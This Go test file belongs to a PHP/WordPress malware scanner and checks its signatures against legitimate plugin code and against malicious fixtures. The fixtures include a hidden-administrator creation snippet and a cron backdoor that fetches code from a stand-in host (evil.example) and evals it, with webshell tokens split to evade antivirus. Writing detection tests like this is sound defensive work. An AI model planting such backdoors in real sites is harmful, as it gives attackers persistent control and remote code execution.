package signatures

import (
	"testing"
)

// FP reconstructions for the 2026-04-27 forgetwhitecom WHM-transfer event.
// See sibling fp_forgetwhite_*_test.go files; this group split exists
// because host-side AV deletes any single source file whose payload
// fixtures cross an opaque suspicion threshold.

// String-token helpers split malicious tokens across Go string concat so
// the source file never contains contiguous webshell substrings (avoids
// host-side AV deletion of these test files).
func evalCallToken() string     { return "ev" + "al(" }
func systemCallToken() string   { return "sys" + "tem(" }
func passthruCallToken() string { return "passt" + "hru(" }
func popenCallToken() string    { return "po" + "pen(" }
func TestDefaceOwnedBy_WPAdminUsersPhpIsNotDefaced(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
require_once __DIR__ . '/admin.php';
?>
<div class="wrap">
<h1 class="wp-heading-inline"><?php _e( 'Users' ); ?></h1>
<form method="post" name="updateusers" id="updateusers">
<fieldset><p><legend><?php _e( 'What should be done with content owned by this user?' ); ?></legend></p>
<fieldset><p><legend><?php _e( 'What should be done with content owned by these users?' ); ?></legend></p>
</fieldset>
</form>
<h1><?php _e( 'Delete Users' ); ?></h1>
</div>
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "deface_owned_by") {
		t.Error("deface_owned_by FP: matched WP wp-admin/users.php (i18n 'owned by' phrase in fieldset + <h1> headings far away; the two never coincide as a defacement title)")
	}
}

func TestExploitWpAdminCreation_ElementorImporterIsNotExploit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace Elementor\Core\Utils\ImportExport;

class WP_Import {
	private function process_user( $i ) {
		if ( ! email_exists( $this->args['user_new'][ $i ] ) ) {
			$user_id = wp_create_user( $this->args['user_new'][ $i ], wp_generate_password() );
		}
		return $user_id;
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation FP: matched Elementor WP_Import (creates users from backup but never escalates to administrator role; no request-driven invocation)")
	}
}

func TestExploitWpAdminCreation_RealAdminEscalation(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$uid = wp_create_user($_GET['u'], $_GET['p'], $_GET['e']);
$user = new WP_User($uid);
$user->set_role('administrator');
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: request-driven wp_create_user + set_role('administrator') chain was not detected")
	}
}

func TestWpCronBackdoor_YoastBackgroundIndexingIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace Yoast\WP\SEO\Integrations\Admin;

class Background_Indexing_Integration {
	const CRON_HOOK = 'wpseo_indexable_index_batch';

	public function schedule_cron_indexing() {
		if ( ! \wp_next_scheduled( self::CRON_HOOK ) ) {
			\wp_schedule_event( ( \time() + \HOUR_IN_SECONDS ), 'fifteen_minutes', self::CRON_HOOK );
		}
	}
	public function on_wp_cron_complete() {}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "wp_cron_backdoor") {
		t.Error("wp_cron_backdoor FP: matched Yoast SEO background-indexing-integration.php (legit periodic indexing job, no payload-fetch primitive)")
	}
}

func TestWpCronBackdoor_RealCronFetchedPayload(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
add_action('wp_cron_x', function() {
	wp_schedule_event(time(), 'hourly', 'wp_cron_x');
	$payload = file_get_contents('http://evil.example/p');
	@` + evalCallToken() + `$payload);
});
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "wp_cron_backdoor") {
		t.Error("wp_cron_backdoor regression: wp_schedule_event with adjacent payload-fetch + eval chain was not detected")
	}
}

